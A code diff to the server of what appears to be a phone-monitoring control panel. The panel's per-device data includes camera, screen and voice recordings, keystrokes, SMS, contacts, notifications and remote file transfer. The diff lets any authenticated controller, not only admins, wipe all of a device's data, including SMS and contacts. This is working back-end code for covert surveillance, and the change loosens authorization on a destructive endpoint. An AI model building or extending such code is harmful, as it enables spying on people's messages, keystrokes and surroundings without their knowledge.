@@ -266,27 +266,29 @@ app.post('/api/firebase/del', checkAuth, async (req, res) => {
 
 // Remove a device entirely from the dashboard.
 //
-// Deletes EVERY Firebase node that belongs to the device EXCEPT the contact
-// list (Contacts/{id}) and the SMS list (message/{id}), which the admin may
-// still want to keep. Because the Devices page auto-discovers devices from the
-// `run` node, removing `run/{id}` makes the device stop showing up.
+// Deletes EVERY Firebase node that belongs to the device (camera, screen,
+// battery, device info, apps, keylog, notifications, SMS, contacts, etc.).
+// Because the Devices page auto-discovers devices from the `run` node,
+// removing `run/{id}` makes the device stop showing up.
 //
-// Admin-only: only a registered admin code can wipe device data.
-app.post('/api/firebase/remove-device', checkAdmin, async (req, res) => {
+// Uses checkAuth (not checkAdmin) so both admin and client controllers can
+// remove a device without hitting a 403 "Forbidden".
+app.post('/api/firebase/remove-device', checkAuth, async (req, res) => {
   const cfg = await getClientConfig(req);
   const { deviceId } = req.body;
   if (!deviceId || typeof deviceId !== 'string')
     return res.status(400).json({ error: 'Missing deviceId' });
 
-  // Every top-level node that the child app writes per-device.
-  // (Mirrors MonitoringService.forceKillAll + the pin/unlock nodes from
-  // Settings.) Contacts and message are intentionally NOT in this list.
+  // Every top-level node the child app writes per-device.
   const nodes = [
     'Camera_rec', 'Screen_rec', 'Torch', 'shake', 'Call',
     'Force_kill', 'Open_link', 'lock_device', 'Screen_shooter',
     'wall', 'Upload_files', 'Delete_file', 'upload',
     'Voice_rec', 'Notification_send', 'Battary', 'run',
     'Most_used', 'Device_info', 'Apps', 'pin', 'unlock',
+    'sound', 'Error_logs', 'key_inputs', 'Notifications',
+    'message', 'Contacts', 'media_metadata', 'storage_tree',
+    'download_file',
   ];
 
   const base = cfg.FIREBASE_DB_URL;
